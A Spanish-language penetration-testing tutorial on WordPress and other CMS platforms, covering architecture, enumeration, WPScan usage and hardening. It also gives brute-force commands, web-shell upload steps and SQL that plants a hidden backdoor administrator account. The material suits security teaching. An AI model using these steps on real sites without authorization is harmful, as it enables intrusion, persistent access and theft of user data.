# CMS Security Testing

## Sistemas de Gestión de Contenidos (CMS)

Un Sistema de Gestión de Contenidos (CMS) es una aplicación o plataforma de software que permite a los usuarios crear, gestionar y publicar contenido digital en la web. Los CMS simplifican el proceso de construcción y mantenimiento de sitios web al proporcionar una interfaz fácil de usar para la creación, edición y organización de contenido.

Los CMS desempeñan un papel crucial en las pruebas de seguridad de aplicaciones web, ya que son comúnmente objetivo de atacantes debido a su uso generalizado. Entender los CMS en el contexto de las pruebas de seguridad es esencial para identificar y mitigar vulnerabilidades de manera efectiva.

Plataformas CMS populares incluyen:

- **WordPress** (impulsa más del 40% de todos los sitios web en internet).
- **Drupal** (comúnmente usado por gobiernos y grandes organizaciones).
- **Joomla** (usado para portales y sitios corporativos).
- **Magento** (enfocado en comercio electrónico).
- **Ghost** (plataforma de blogging).

---

## Por Qué Se Atacan los CMS

Los CMS son integrales para las aplicaciones web y los sitios web, lo que los convierte en un objetivo principal para las pruebas de seguridad por varias razones:

- **Ubicuidad**: CMS como WordPress, Drupal y Joomla impulsan una parte significativa de los sitios web en internet. Su uso generalizado los hace objetivos atractivos para los atacantes.
- **Complejidad**: Los CMS son ricos en funcionalidades, ofreciendo varios plugins, temas y opciones de personalización. Esta complejidad puede introducir vulnerabilidades de seguridad.
- **Actualizaciones Regulares**: Los CMS lanzan frecuentemente actualizaciones y parches de seguridad para abordar vulnerabilidades. Las pruebas aseguran que estas actualizaciones se apliquen correctamente.
- **Datos de Usuario**: Los CMS a menudo manejan datos sensibles de usuarios, lo que hace que la seguridad sea crucial para proteger contra brechas de datos.

---

## Preocupaciones de Seguridad Comunes con los CMS

- **Vulnerabilidades**: Los CMS pueden tener vulnerabilidades como inyección SQL, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF) y más, que necesitan ser identificadas y parcheadas.
- **Autenticación y Autorización**: Las pruebas deben verificar que los mecanismos de autenticación y autorización de usuarios sean robustos y que los roles y permisos de usuario se apliquen correctamente.
- **Problemas de Configuración**: Las configuraciones incorrectas, las credenciales por defecto y los permisos excesivamente permisivos pueden provocar vulnerabilidades de seguridad.
- **Seguridad de Plugins y Temas**: Los CMS permiten la instalación de plugins y temas, que pueden introducir vulnerabilidades si no se desarrollan y mantienen de manera segura.

---

# Metodología de Pruebas de Seguridad CMS

Un enfoque estructurado para las pruebas de seguridad CMS sigue estas fases:

## 1. Recopilación de Información y Enumeración

- Identificar el CMS y su versión.
- Identificar usuarios, plugins y temas.
- Realizar enumeración de directorios y archivos.

## 2. Escaneo de Vulnerabilidades

- Probar configuraciones incorrectas y vulnerabilidades comunes.
- Realizar escaneo y análisis de vulnerabilidades para identificar posibles vulnerabilidades o configuraciones incorrectas en plugins y temas.

## 3. Pruebas de Autenticación

- Realizar enumeración de nombres de usuario y ataques de fuerza bruta en páginas de inicio de sesión.
- Evaluar el manejo de sesiones en busca de debilidades y posibles vulnerabilidades de fijación de sesión.

## 4. Explotación

- Identificar y explotar vulnerabilidades conocidas en el núcleo del CMS.
- Identificar y explotar vulnerabilidades en plugins, extensiones y temas.

## 5. Post-Explotación

- Identificar formas de mantener el acceso al CMS después de la explotación en forma de backdoor o web shell.
- Intentar extraer datos del CMS o del servidor subyacente.

---

# Herramientas de Identificación de CMS

Antes de probar un CMS, debe identificar qué CMS está ejecutando el objetivo y enumerar sus componentes.

## Herramientas Comunes de Identificación de CMS

| Herramienta | Descripción |
|---|---|
| `Wappalyzer` | Extensión de navegador y herramienta CLI que identifica tecnologías incluyendo CMS |
| `WhatWeb` | Herramienta CLI que identifica CMS, frameworks y tecnologías web |
| `WPScan` | Escáner de vulnerabilidades de WordPress especializado |
| `CMSeek` | Kit de herramientas de detección y explotación de CMS |
| `droopescan` | Escáner de CMS basado en plugins para Drupal, WordPress, SilverStripe, etc. |
| `Joomscan` | Escáner de vulnerabilidades de Joomla |
| `cmsmap` | Escáner de CMS que soporta WordPress, Joomla y Drupal |

### Ejemplo: WhatWeb

```bash
whatweb https://target.local  # identifica el CMS y otras tecnologías web.
```

### Ejemplo: CMSeek

```bash
cmseek -u https://target.local  # detecta el CMS y realiza una enumeración básica.
```

---

# Introducción a WordPress

## Qué Es WordPress

WordPress es uno de los Sistemas de Gestión de Contenidos (CMS) más populares y utilizados para construir sitios web y aplicaciones web. Es un CMS de código abierto, lo que significa que su código fuente está disponible para examen y modificación por parte de la comunidad.

WordPress es altamente modular, permitiendo a los usuarios extender su funcionalidad a través de plugins y temas. Proporciona una interfaz de usuario intuitiva para la gestión de contenido, haciéndolo accesible para usuarios no técnicos.

En el contexto de las pruebas de seguridad de aplicaciones web, entender WordPress es crucial, ya que es un objetivo frecuente para los atacantes.

## Arquitectura de WordPress

WordPress está construido principalmente en PHP y utiliza una base de datos MySQL o MariaDB. Entender su arquitectura es esencial para realizar pruebas de seguridad efectivas.

### Estructura de Directorios del Núcleo

Una instalación típica de WordPress tiene la siguiente estructura:

```text
/var/www/html/wordpress/
├── wp-admin/             # Archivos del panel de administración
│   ├── login.php         # Página de inicio de sesión
│   ├── admin.php         # Punto de entrada del panel de administración
│   └── ...
├── wp-includes/          # Funciones y bibliotecas del núcleo de WordPress
│   ├── wp-db.php         # Capa de abstracción de base de datos
│   ├── pluggable.php     # Funciones de autenticación
│   └── ...
├── wp-content/           # Contenido subido por el usuario y personalizado
│   ├── plugins/          # Plugins instalados (cada uno en su propio subdirectorio)
│   ├── themes/           # Temas instalados (cada uno en su propio subdirectorio)
│   ├── uploads/          # Archivos subidos por el usuario (imágenes, documentos, etc.)
│   └── ...
├── wp-config.php         # Archivo de configuración principal (credenciales de BD, claves)
├── wp-login.php          # Página de inicio de sesión
├── wp-signup.php         # Página de registro (multisitio)
├── xmlrpc.php            # Interfaz XML-RPC (pingbacks, publicación remota)
├── wp-load.php           # Archivo bootstrap que carga WordPress
├── index.php              # Controlador frontal
├── .htaccess              # Configuración de Apache (enlaces permanentes, redirecciones)
└── wp-json/               # Endpoint de la REST API (/wp-json/wp/v2/)
```

### Archivos Clave para Pruebas de Seguridad

| Archivo / Ruta | Importancia |
|---|---|
| `wp-config.php` | Contiene credenciales de base de datos, claves de autenticación y salts. Si es legible, revela los detalles de conexión a la base de datos |
| `wp-login.php` | Página de inicio de sesión — objetivo para fuerza bruta y credential stuffing |
| `wp-admin/` | Panel de administración — el acceso requiere autenticación |
| `wp-content/uploads/` | Archivos subidos por el usuario — ubicación potencial para web shells |
| `wp-content/plugins/` | Plugins instalados — cada plugin puede introducir vulnerabilidades |
| `wp-content/themes/` | Temas instalados — los temas pueden contener vulnerabilidades |
| `xmlrpc.php` | Interfaz XML-RPC — puede usarse para amplificación de fuerza bruta y DDoS por pingback |
| `wp-json/` | REST API — puede exponer datos de usuario y endpoints |
| `readme.html` | Archivo por defecto que revela la versión de WordPress |
| `wp-content/debug.log` | Archivo de log de depuración — puede contener información sensible si el modo debug está activado |
| `wp-trackback.php` | Funcionalidad de trackback — puede abusarse para DDoS |

### Estructura de la Base de Datos de WordPress

WordPress utiliza una base de datos MySQL o MariaDB con las siguientes tablas principales:

| Tabla | Contenido |
|---|---|
| `wp_users` | Cuentas de usuario (nombres de usuario, direcciones de email, hashes de contraseñas) |
| `wp_usermeta` | Metadatos de usuario (roles, capacidades) |
| `wp_posts` | Entradas, páginas y tipos de contenido personalizados |
| `wp_options` | Configuración del sitio, ajustes de plugins, temas activos |
| `wp_terms` | Categorías y etiquetas |
| `wp_comments` | Comentarios y sus metadatos |

La tabla `wp_users` almacena hashes de contraseñas usando `phpass` (hash portable basado en MD5) por defecto. En versiones más recientes, puede usarse bcrypt o Argon2 dependiendo de la configuración de PHP.

## Roles de Usuario de WordPress

WordPress implementa un sistema de control de acceso basado en roles:

| Rol | Capacidades |
|---|---|
| **Super Admin** | Acceso completo a toda la red (solo multisitio) |
| **Administrator** | Acceso completo a un solo sitio, incluyendo plugins y temas |
| **Editor** | Puede publicar y gestionar entradas, incluyendo las de otros usuarios |
| **Author** | Puede publicar y gestionar sus propias entradas |
| **Contributor** | Puede escribir y gestionar sus propias entradas pero no publicarlas |
| **Subscriber** | Solo puede leer entradas y gestionar su perfil |

Desde una perspectiva de seguridad, el rol de **Administrador** es el objetivo principal — obtener acceso de administrador significa control total sobre el sitio de WordPress, incluyendo la capacidad de subir plugins (y por tanto web shells).

---

## Relevancia de Seguridad de WordPress

- **Altamente Atacado**: Debido a su prevalencia, WordPress es un objetivo principal para los atacantes que buscan explotar vulnerabilidades.
- **Ecosistema de Plugins**: La gran cantidad de plugins y temas de terceros aumenta la superficie de ataque e introduce posibles riesgos de seguridad.
- **Actualizaciones Frecuentes**: WordPress lanza actualizaciones y parches de seguridad regularmente para abordar vulnerabilidades conocidas.

---

## Vulnerabilidades Comunes de WordPress

### Plugins y Temas Vulnerables

Los plugins y temas a menudo contienen vulnerabilidades que pueden ser explotadas. Dado que el ecosistema de WordPress depende en gran medida de desarrolladores de terceros, la calidad y seguridad de los plugins varían significativamente. Muchos plugins están abandonados, desactualizados o nunca recibieron una auditoría de seguridad.

Vulnerabilidades comunes de plugins/temas incluyen:

- Inyección SQL a través de parámetros de entrada no sanitizados.
- XSS vía entrada reflejada o almacenada en páginas de plugins.
- Subida arbitraria de archivos a través de formularios de subida validados incorrectamente.
- Inclusión de Archivos Locales (LFI) vía parámetros de ruta no sanitizados.
- Ejecución Remota de Código (RCE) a través de llamadas inseguras a `eval()`, `system()` o `exec()`.
- SSRF a través de plugins que obtienen URLs remotas.

### Ataques de Fuerza Bruta

Los atacantes pueden intentar adivinar credenciales de inicio de sesión a través de ataques de fuerza bruta contra `wp-login.php` o `xmlrpc.php`.

WordPress no implementa bloqueo de cuenta por defecto, lo que lo hace vulnerable a ataques de fuerza bruta a menos que se instalen plugins de seguridad adicionales.

### Inyección SQL

Los sitios de WordPress pueden ser vulnerables a ataques de inyección SQL si la validación de entrada es inadecuada. Esto puede ocurrir en:

- El núcleo de WordPress (raro en versiones recientes, pero existen vulnerabilidades históricas).
- Plugins y temas que construyen consultas SQL sin la sanitización adecuada.
- Código personalizado añadido por los desarrolladores del sitio.

### Cross-Site Scripting (XSS)

Las vulnerabilidades XSS pueden introducirse a través de:

- Plugins que muestran entrada de usuario sin el escape adecuado.
- Temas que no sanitizan el contenido de entradas o comentarios.
- Código personalizado que usa funciones de WordPress inseguras.

### Cross-Site Request Forgery (CSRF)

Los ataques CSRF pueden comprometer la seguridad de un sitio de WordPress si los mecanismos de autorización son débiles. El núcleo de WordPress usa nonces (tokens criptográficos) para protegerse contra CSRF, pero los plugins pueden no implementarlos correctamente.

### Configuración Insegura

Las configuraciones incorrectas, las contraseñas débiles y los ajustes excesivamente permisivos pueden provocar problemas de seguridad:

- Prefijo de tabla de base de datos por defecto (`wp_`) — facilita la inyección SQL automatizada.
- Modo debug activado en producción (`WP_DEBUG` puesto en `true` en `wp-config.php`).
- Edición de archivos permitida en el panel de administración (`DISALLOW_FILE_EDIT` no establecido).
- Contraseñas de administrador débiles.
- Registro de usuario sin restricciones (`anyone can register` activado con el rol por defecto establecido en Subscriber o Contributor).
- Listado de directorios habilitado en el servidor web.
- `wp-config.php` con permisos de lectura para todos.
- Acceso sin restricciones a `xmlrpc.php`.
- Archivos `readme.html` y de licencia por defecto presentes.

---

# Metodología de Pentesting WordPress

## 1. Recopilación de Información y Enumeración

### Escaneo de Puertos y Enumeración de Servicios

```bash
nmap -sV -sC target.local  # escanea puertos abiertos e identifica servicios (servidor web, base de datos, etc.).
```

```bash
nmap -p 80,443,3306,8080 --script=http-enum target.local  # enumera rutas web comunes e identifica WordPress.
```

### Identificar la Versión de WordPress

La versión de WordPress puede identificarse a través de varios métodos:

**Comprobar la etiqueta meta generator:**

```bash
curl -s http://target.local | grep -i generator  # extrae la versión de WordPress de la etiqueta meta HTML.
```

**Comprobar readme.html:**

```bash
curl -s http://target.local/readme.html | grep -i version  # extrae la versión del archivo readme por defecto.
```

**Comprobar el feed:**

```bash
curl -s http://target.local/feed/ | grep -i generator  # extrae la versión del feed RSS.
```

### Enumerar Temas y Plugins

**Comprobar el código fuente HTML para rutas de temas y plugins:**

```bash
curl -s http://target.local | grep -oP 'wp-content/(themes|plugins)/[^/]+' | sort -u  # extrae nombres de directorios de temas y plugins del código fuente de la página.
```

**Enumerar plugins con Gobuster:**

```bash
gobuster dir -u http://target.local/wp-content/plugins/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,403  # fuerza bruta de directorios de plugins.
```

**Enumerar temas con Gobuster:**

```bash
gobuster dir -u http://target.local/wp-content/themes/ -w /usr/share/wordlists/dirb/common.txt -s 200,301,403  # fuerza bruta de directorios de temas.
```

### Enumeración de Archivos y Directorios

```bash
gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old -t 30 -o wp-enum.txt  # enumera archivos y directorios.
```

Rutas clave a comprobar:

```text
/wp-admin/
/wp-login.php
/wp-config.php
/wp-content/uploads/
/wp-content/plugins/
/wp-content/themes/
/xmlrpc.php
/wp-json/
/readme.html
/wp-content/debug.log
/wp-content/backups/
/wp-content/upgrade/
```

---

## 2. Escaneo de Vulnerabilidades con WPScan

**WPScan** es la herramienta principal para pruebas de seguridad de WordPress. Es un escáner de vulnerabilidades de WordPress gratuito y de código abierto que puede enumerar plugins, temas, usuarios e identificar vulnerabilidades conocidas.

### Instalación

WPScan viene preinstalado en Kali Linux. Para actualizarlo:

```bash
wpscan --update  # actualiza la base de datos y la herramienta WPScan.
```

### Escaneo Básico

```bash
wpscan --url http://target.local  # realiza un escaneo básico de WordPress.
```

### Enumeración Agresiva de Plugins

```bash
wpscan --url http://target.local --enumerate ap  # enumera agresivamente todos los plugins.
```

### Enumerar Plugins Vulnerables

```bash
wpscan --url http://target.local --enumerate vp  # enumera plugins vulnerables conocidos.
```

### Enumerar Temas

```bash
wpscan --url http://target.local --enumerate t  # enumera los temas instalados.
```

### Enumerar Temas Vulnerables

```bash
wpscan --url http://target.local --enumerate vt  # enumera temas vulnerables conocidos.
```

### Enumerar Usuarios

```bash
wpscan --url http://target.local --enumerate u  # enumera usuarios de WordPress.
```

### Enumeración Completa

```bash
wpscan --url http://target.local --enumerate ap at u --random-user-agent -o wpscan-results.txt  # enumeración completa con user agents aleatorios, guarda los resultados.
```

### Códigos de Enumeración de WPScan

| Código | Lo Que Enumera |
|---|---|
| `u` | Usuarios |
| `p` | Plugins populares |
| `ap` | Todos los plugins (agresivo, más lento) |
| `vp` | Plugins vulnerables |
| `t` | Temas populares |
| `at` | Todos los temas (agresivo, más lento) |
| `vt` | Temas vulnerables |
| `cb` | Copias de seguridad de configuración |
| `dbe` | Exportaciones de base de datos |
| `tt` | Timthumbs |

### Escaneo con API Token

WPScan puede comprobar plugins y temas contra su base de datos de vulnerabilidades usando un API token. Un API token gratuito está disponible registrándose en el sitio web de WPScan.

```bash
wpscan --url http://target.local --api-token YOUR_API_TOKEN --enumerate vp,vt  # comprueba vulnerabilidades conocidas usando la API.
```

---

## 3. Pruebas de Autenticación

### Enumeración de Nombres de Usuario

La enumeración de usuarios de WordPress puede realizarse a través de:

**WPScan:**

```bash
wpscan --url http://target.local --enumerate u  # enumera usuarios vía la REST API y archivos de autor.
```

**REST API:**

```bash
curl -s http://target.local/wp-json/wp/v2/users | jq  # recupera información de usuarios vía la REST API de WordPress.
```

**Archivos de Autor:**

```bash
curl -s -I http://target.local/?author=1  # comprueba IDs de usuario vía redirecciones de archivos de autor.
curl -s -I http://target.local/?author=2  # comprueba el siguiente ID de usuario.
```

### Fuerza Bruta de Inicio de Sesión con WPScan

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --max-threads 50  # fuerza bruta de la contraseña de admin.
```

```bash
wpscan --url http://target.local -U users.txt -P /usr/share/wordlists/rockyou.txt -o wp-brute.txt  # fuerza bruta de múltiples usuarios con una lista de contraseñas.
```

### Fuerza Bruta vía xmlrpc.php

El endpoint `xmlrpc.php` puede usarse para ataques de fuerza bruta porque permite múltiples intentos de contraseña dentro de una sola solicitud HTTP (vía el método `system.multicall`), lo que puede eludir la limitación de tasa en `wp-login.php`.

```bash
wpscan --url http://target.local -U admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall  # fuerza bruta vía xmlrpc.php multicall.
```

---

## 4. Explotación

### Explotar Vulnerabilidades Conocidas

Una vez identificado un plugin, tema o versión de WordPress vulnerable, busque exploits disponibles públicamente:

```bash
searchsploit wordpress plugin <plugin-name>  # busca exploits conocidos en exploitdb.
```

```bash
msfconsole -q -x "search wordpress; exit"  # busca módulos de WordPress en Metasploit.
```

### Rutas de Explotación Comunes de WordPress

| Vector de Ataque | Descripción |
|---|---|
| RCE en plugin vulnerable | Explotar una vulnerabilidad RCE conocida en un plugin desactualizado |
| Subida arbitraria de archivos | Abusar de la funcionalidad de subida de un plugin para subir un web shell |
| Inyección SQL en plugin | Extraer datos de la base de datos vía entradas de plugin no sanitizadas |
| XSS en tema | Inyectar JavaScript malicioso vía vulnerabilidades de tema |
| Amplificación vía xmlrpc.php | Usar multicall para amplificación de fuerza bruta o DDoS por pingback |
| Enumeración de usuarios vía REST API | Extraer nombres de usuario vía `/wp-json/wp/v2/users` |
| Divulgación de wp-config.php | Leer el archivo de configuración para obtener credenciales de base de datos |
| Lectura arbitraria de archivos | Explotar LFI o path traversal en plugins para leer archivos sensibles |

### Subir un Web Shell vía el Panel de Administración

Una vez obtenido acceso de administrador, se puede subir un web shell a través del editor de plugins o instalando un plugin malicioso:

**Método 1: Subida de Plugin**

1. Acceder a `wp-admin/plugin-install.php`.
2. Subir un ZIP de plugin malicioso que contenga un web shell PHP.
3. Activar el plugin.
4. Acceder al web shell en `wp-content/plugins/malicious-plugin/shell.php`.

**Método 2: Editor de Temas**

Si la edición de archivos no está deshabilitada (`DISALLOW_FILE_EDIT` no establecido en `wp-config.php`):

1. Acceder a `wp-admin/theme-editor.php`.
2. Editar un archivo del tema (ej. `404.php`) e inyectar código PHP.
3. Acceder al archivo modificado (ej. `http://target.local/wp-content/themes/twentytwentyfour/404.php`).

**Método 3: Subida de Medios**

1. Acceder a `wp-admin/media-new.php`.
2. Subir un archivo PHP disfrazado de imagen (puede requerir eludir las restricciones de subida).
3. Acceder al archivo subido en `wp-content/uploads/YYYY/MM/`.

---

## 5. Post-Explotación

### Mantener el Acceso

Después de obtener acceso a un sitio de WordPress, la persistencia puede mantenerse a través de:

- **Web shells**: Subir un web shell PHP en `wp-content/uploads/`, un directorio de temas o de plugins.
- **Plugins backdoor**: Crear un plugin personalizado que contenga un backdoor oculto.
- **Archivos de tema modificados**: Inyectar código backdoor en un archivo de tema existente (ej. `functions.php`).
- **Nuevo usuario admin**: Crear una nueva cuenta de administrador que sea menos probable que se note.
- **`wp-config.php` modificado**: Inyectar código PHP en el archivo de configuración.

### Crear un Nuevo Usuario Admin vía la Base de Datos

Si se obtiene acceso a la base de datos:

```sql
INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name)
VALUES ('backdoor', MD5('password123'), 'backdoor', 'backdoor@example.com', NOW(), 0, 'backdoor');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
VALUES (LAST_INSERT_ID(), 'wp_user_level', '10');
```

### Exfiltración de Datos

Datos sensibles que pueden extraerse de un sitio de WordPress comprometido:

- Credenciales de usuario de `wp_users` (hashes de contraseñas).
- Direcciones de email y datos personales.
- Datos de configuración de plugins y temas.
- Credenciales de base de datos de `wp-config.php`.
- Archivos y documentos subidos desde `wp-content/uploads/`.
- Claves de API y secretos almacenados en ajustes de plugins (en `wp_options`).

---

# Otras Herramientas de Pruebas de CMS

Aunque WordPress es el CMS más comúnmente probado, existen herramientas y metodologías similares para otros CMS:

## Drupal

```bash
droopescan scan drupal -u http://target.local  # escanea un sitio Drupal en busca de vulnerabilidades y versión.
```

```bash
cmsmap http://target.local  # escanea sitios CMS incluyendo Drupal.
```

Rutas clave de Drupal a enumerar:

```text
/user/login
/admin
/modules/
/themes/
/sites/default/settings.php  # equivalente a wp-config.php
/CHANGELOG.txt               # revela la versión de Drupal
```

## Joomla

```bash
joomscan -u http://target.local  # escanea un sitio Joomla en busca de vulnerabilidades.
```

```bash
cmsmap http://target.local  # también soporta escaneo de Joomla.
```

Rutas clave de Joomla a enumerar:

```text
/administrator/
/components/
/modules/
/plugins/
/configuration.php  # equivalente a wp-config.php
/README.txt         # puede revelar la versión de Joomla
```

---

# Lista de Endurecimiento de WordPress

Recomendaciones de seguridad comunes para WordPress:

- Mantener el núcleo de WordPress, los plugins y los temas actualizados.
- Usar contraseñas fuertes y únicas para todas las cuentas de administrador.
- Limitar los intentos de inicio de sesión (mediante plugins o reglas del lado del servidor).
- Deshabilitar la edición de archivos en el panel de administración (`DISALLOW_FILE_EDIT` puesto en `true` en `wp-config.php`).
- Deshabilitar o restringir `xmlrpc.php` si no es necesario.
- Cambiar el prefijo de tabla de base de datos por defecto de `wp_`.
- Mover `wp-config.php` un directorio por encima de la raíz web si es posible.
- Deshabilitar el listado de directorios en el servidor web.
- Eliminar archivos por defecto (`readme.html`, `license.txt`).
- Restringir el acceso a `wp-admin` por IP si es posible.
- Deshabilitar el registro de usuarios si no es necesario.
- Establecer permisos de archivo correctos (archivos: `644`, directorios: `755`, `wp-config.php`: `600`).
- Usar HTTPS para todas las conexiones.
- Instalar un WAF o plugin de seguridad.
- Hacer copias de seguridad regulares del sitio y la base de datos.
- Eliminar plugins y temas no utilizados.
- Activar el registro de depuración a un archivo solo, no a la pantalla (`WP_DEBUG_DISPLAY` puesto en `false`).

---

# Puntos Clave

- Los CMS son objetivos principales para las pruebas de seguridad debido a su ubicuidad y complejidad.
- La metodología de pentesting CMS sigue: recopilación de información, escaneo de vulnerabilidades, pruebas de autenticación, explotación y post-explotación.
- WordPress es el CMS más utilizado y el más frecuentemente atacado.
- La arquitectura de WordPress incluye directorios del núcleo (`wp-admin`, `wp-includes`, `wp-content`) y archivos clave (`wp-config.php`, `wp-login.php`, `xmlrpc.php`).
- Los roles de usuario de WordPress determinan los niveles de acceso (Administrator, Editor, Author, Contributor, Subscriber).
- Las vulnerabilidades comunes de WordPress incluyen plugins/temas vulnerables, ataques de fuerza bruta, inyección SQL, XSS, CSRF y configuraciones inseguras.
- WPScan es la herramienta principal para enumeración y escaneo de vulnerabilidades de WordPress.
- La enumeración de usuarios puede realizarse vía la REST API, archivos de autor o WPScan.
- xmlrpc.php puede usarse para amplificación de fuerza bruta vía multicall.
- El acceso de administrador permite subir web shells vía plugins, editor de temas o subidas de medios.
- La post-explotación incluye mantener el acceso vía web shells, plugins backdoor o crear nuevos usuarios admin.
- Otros CMS (Drupal, Joomla) tienen enfoques de prueba similares con herramientas y rutas específicas de la plataforma.
- Valide siempre los hallazgos manualmente antes de reportarlos como vulnerabilidades.
